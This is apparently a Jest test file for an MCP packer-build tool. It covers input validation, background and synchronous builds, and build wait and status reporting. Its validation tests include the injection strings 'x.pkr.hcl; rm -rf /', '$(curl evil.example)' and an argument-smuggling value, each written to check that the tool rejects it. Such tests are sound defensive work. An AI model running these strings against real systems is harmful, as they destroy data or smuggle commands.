jest.mock('../run-command.js', () => ({
  getRepoRoot: () => '/repo',
  runCommand: jest.fn(),
}));

// packer-build runs its builds on the shared job runner (LS-8564). Mock the
// runner so tests drive the tool contract through controlled snapshots
// instead of real child processes.
jest.mock('@legacy-sports/mcp-jobs', () => {
  const startJob = jest.fn();
  const snapshotJob = jest.fn();
  const waitForJob = jest.fn();
  return {
    MAX_WAIT_MS: 55_000,
    createJobRunner: () => ({
      startJob,
      snapshotJob,
      waitForJob,
      runJobWithBudget: jest.fn(),
      listJobs: jest.fn(),
    }),
    __mock: { startJob, snapshotJob, waitForJob },
  };
});

import type { JobSnapshot } from '@legacy-sports/mcp-jobs';
import { runCommand } from '../run-command.js';
import {
  packerBuild,
  packerBuildStatus,
  packerBuildWait,
} from './packer-build.js';

const mockedRun = runCommand as jest.MockedFunction<typeof runCommand>;
const { __mock: runnerMock } = jest.requireMock('@legacy-sports/mcp-jobs') as {
  __mock: {
    startJob: jest.Mock;
    snapshotJob: jest.Mock;
    waitForJob: jest.Mock;
  };
};

const BUILD_LOG =
  "==> amazon-ebs.runner: AMI: ami-0abc1234def56789a\nBuild 'amazon-ebs.runner' finished after 2 minutes 5 seconds.\n";

const IMAGE_META_JSON = JSON.stringify({
  Images: [
    {
      Name: 'runner-ami',
      BlockDeviceMappings: [{ Ebs: { SnapshotId: 'snap-0abc123' } }],
      Tags: [{ Key: 'role', Value: 'runner' }],
    },
  ],
});

const BUILD_ID = 'packer-1700000000000-abc1234';

function snapshot(overrides: Partial<JobSnapshot>): JobSnapshot {
  return {
    jobId: BUILD_ID,
    status: 'running',
    label: 'packer build x.pkr.hcl',
    cwd: '/repo',
    elapsedSec: 3,
    exitCode: null,
    error: null,
    ...overrides,
  };
}

function startedJob(): void {
  runnerMock.startJob.mockReturnValue({
    jobId: BUILD_ID,
    logPath: `/tmp/packer-builds/${BUILD_ID}.log`,
    existing: false,
  });
}

function body(result: {
  content: Array<{ type: string; text?: string }>;
  isError?: boolean;
}): { parsed: Record<string, unknown>; isError: boolean } {
  const block = result.content[0];
  if (!block || block.type !== 'text' || !block.text)
    throw new Error('expected text block');
  return {
    parsed: JSON.parse(block.text) as Record<string, unknown>,
    isError: Boolean(result.isError),
  };
}

/** runCommand mock: aws describe-images resolves image metadata. */
function mockCommands(): void {
  mockedRun.mockImplementation((command) =>
    Promise.resolve(command === 'aws' ? IMAGE_META_JSON : ''),
  );
}

beforeEach(() => {
  mockedRun.mockReset();
  runnerMock.startJob.mockReset();
  runnerMock.snapshotJob.mockReset();
  runnerMock.waitForJob.mockReset();
});

describe('packerBuild input validation', () => {
  it('rejects an hclPath with shell metacharacters without invoking packer', async () => {
    const { parsed, isError } = body(
      await packerBuild({
        hclPath: 'x.pkr.hcl; rm -rf /',
        runInBackground: true,
      }),
    );
    expect(isError).toBe(true);
    expect(String(parsed.error)).toMatch(/Invalid hclPath/);
    expect(mockedRun).not.toHaveBeenCalled();
    expect(runnerMock.startJob).not.toHaveBeenCalled();
  });

  it('rejects a var value with shell metacharacters without invoking packer', async () => {
    const { parsed, isError } = body(
      await packerBuild({
        hclPath: 'x.pkr.hcl',
        vars: { ami_name: '$(curl evil.example)' },
        runInBackground: true,
      }),
    );
    expect(isError).toBe(true);
    expect(String(parsed.error)).toMatch(/disallowed characters/);
    expect(mockedRun).not.toHaveBeenCalled();
    expect(runnerMock.startJob).not.toHaveBeenCalled();
  });

  it('rejects a var value with spaces (argument smuggling through the shell join)', async () => {
    const { parsed, isError } = body(
      await packerBuild({
        hclPath: 'x.pkr.hcl',
        vars: { ami_name: 'x -var evil=1' },
        runInBackground: true,
      }),
    );
    expect(isError).toBe(true);
    expect(String(parsed.error)).toMatch(/disallowed characters/);
    expect(runnerMock.startJob).not.toHaveBeenCalled();
  });

  it('rejects a var name that is not a plain identifier', async () => {
    const { parsed, isError } = body(
      await packerBuild({
        hclPath: 'x.pkr.hcl',
        vars: { 'bad name': 'value' },
        runInBackground: true,
      }),
    );
    expect(isError).toBe(true);
    expect(String(parsed.error)).toMatch(/Invalid var name/);
    expect(runnerMock.startJob).not.toHaveBeenCalled();
  });

  it('accepts a Windows-style absolute hclPath', async () => {
    startedJob();

    const { parsed, isError } = body(
      await packerBuild({
        hclPath: 'D:\\repo\\terraform\\runners\\packer\\runner-ami.pkr.hcl',
        runInBackground: true,
      }),
    );
    expect(isError).toBe(false);
    expect(parsed.ok).toBe(true);
  });
});

describe('packerBuild', () => {
  it('returns immediately with a buildId when runInBackground=true', async () => {
    startedJob();

    const { parsed, isError } = body(
      await packerBuild({ hclPath: 'x.pkr.hcl', runInBackground: true }),
    );
    expect(isError).toBe(false);
    expect(parsed.ok).toBe(true);
    expect(String(parsed.buildId)).toMatch(/^packer-/);
    expect(String(parsed.message)).toMatch(/packer_build_status/);
  });

  it('runs packer init and packer build as one shell-composite job', async () => {
    startedJob();

    await packerBuild({
      hclPath: 'x.pkr.hcl',
      vars: { ami_name: 'runner' },
      runInBackground: true,
    });

    expect(runnerMock.startJob).toHaveBeenCalledTimes(1);
    const opts = runnerMock.startJob.mock.calls[0][0] as {
      command: string;
      args: string[];
      shell?: boolean;
    };
    expect(opts.command).toBe('packer');
    expect(opts.shell).toBe(true);
    expect(opts.args[0]).toBe('init');
    expect(opts.args).toContain('&&');
    expect(opts.args).toContain('build');
    expect(opts.args).toContain('ami_name=runner');
  });

  it('returns a running snapshot with a re-arm hint when the build outlives the sync budget', async () => {
    startedJob();
    runnerMock.waitForJob.mockResolvedValue(
      snapshot({ status: 'running', logTail: 'transforming...' }),
    );

    const { parsed, isError } = body(
      await packerBuild({ hclPath: 'x.pkr.hcl', maxWaitSeconds: 0 }),
    );
    expect(isError).toBe(false);
    expect(parsed.ok).toBe(true);
    expect(parsed.status).toBe('running');
    expect(String(parsed.hint)).toMatch(/packer_build_wait/);
  });

  it('returns the finished structured result when the build completes within the budget', async () => {
    mockCommands();
    startedJob();
    runnerMock.waitForJob.mockResolvedValue(
      snapshot({ status: 'done', exitCode: 0, log: BUILD_LOG }),
    );

    const { parsed, isError } = body(
      await packerBuild({ hclPath: 'x.pkr.hcl', maxWaitSeconds: 10 }),
    );
    expect(isError).toBe(false);
    expect(parsed.ok).toBe(true);
    expect(parsed.status).toBe('done');
    expect(parsed.amiId).toBe('ami-0abc1234def56789a');
    expect(parsed.durationSec).toBe(125);
    expect(parsed.snapshotId).toBe('snap-0abc123');
  });

  it('surfaces a packer init failure inside the job as a failed build, not a hang', async () => {
    startedJob();
    // `packer init` runs inside the composite job: a plugin-download failure
    // exits the job non-zero and its output lands in the job log.
    runnerMock.waitForJob.mockResolvedValue(
      snapshot({
        status: 'failed',
        exitCode: 1,
        error: 'packer build x.pkr.hcl exited with code 1',
        log: 'Error: plugin download failed\n',
      }),
    );

    const { parsed, isError } = body(
      await packerBuild({ hclPath: 'x.pkr.hcl', maxWaitSeconds: 10 }),
    );
    expect(isError).toBe(true);
    expect(parsed.ok).toBe(false);
    expect(String(parsed.error)).toMatch(/exited with code 1/);
    expect(String(parsed.logTail)).toMatch(/plugin download failed/);
  });
});

describe('packerBuildWait', () => {
  it('errors on an unknown buildId', async () => {
    runnerMock.waitForJob.mockResolvedValue(null);

    const { parsed, isError } = body(
      await packerBuildWait({ buildId: 'packer-nope' }),
    );
    expect(isError).toBe(true);
    expect(String(parsed.error)).toMatch(/not found/);
  });

  it('returns a non-error running snapshot when the wait cap expires', async () => {
    runnerMock.waitForJob.mockResolvedValue(
      snapshot({ status: 'running', logTail: 'still baking' }),
    );

    const { parsed, isError } = body(
      await packerBuildWait({ buildId: BUILD_ID, timeoutSec: 0 }),
    );
    expect(isError).toBe(false);
    expect(parsed.ok).toBe(true);
    expect(parsed.status).toBe('running');
    expect(String(parsed.hint)).toMatch(/packer_build_wait/);
  });

  it('returns the finished result once the build completes', async () => {
    mockCommands();
    runnerMock.waitForJob.mockResolvedValue(
      snapshot({ status: 'done', exitCode: 0, log: BUILD_LOG }),
    );

    const { parsed, isError } = body(
      await packerBuildWait({
        buildId: BUILD_ID,
        timeoutSec: 10,
        pollIntervalSec: 1,
      }),
    );
    expect(isError).toBe(false);
    expect(parsed.status).toBe('done');
    expect(parsed.amiId).toBe('ami-0abc1234def56789a');
  });
});

describe('packerBuildStatus', () => {
  it('reports running with elapsed time for an in-flight build', async () => {
    runnerMock.snapshotJob.mockReturnValue(
      snapshot({ status: 'running', logTail: 'transforming...' }),
    );

    const { parsed, isError } = body(
      await packerBuildStatus({ buildId: BUILD_ID }),
    );
    expect(isError).toBe(false);
    expect(parsed.status).toBe('running');
    expect(typeof parsed.elapsedSec).toBe('number');
  });

  it('reports a disk-recovered build with no recorded result as orphaned', async () => {
    runnerMock.snapshotJob.mockReturnValue(
      snapshot({
        status: 'orphaned',
        logTail: BUILD_LOG,
        hint: 'started by a previous MCP server process',
      }),
    );

    const { parsed, isError } = body(
      await packerBuildStatus({ buildId: BUILD_ID }),
    );
    expect(isError).toBe(true);
    expect(parsed.ok).toBe(false);
    expect(parsed.status).toBe('orphaned');
    expect(String(parsed.hint)).toMatch(/previous MCP server process/);
  });
});
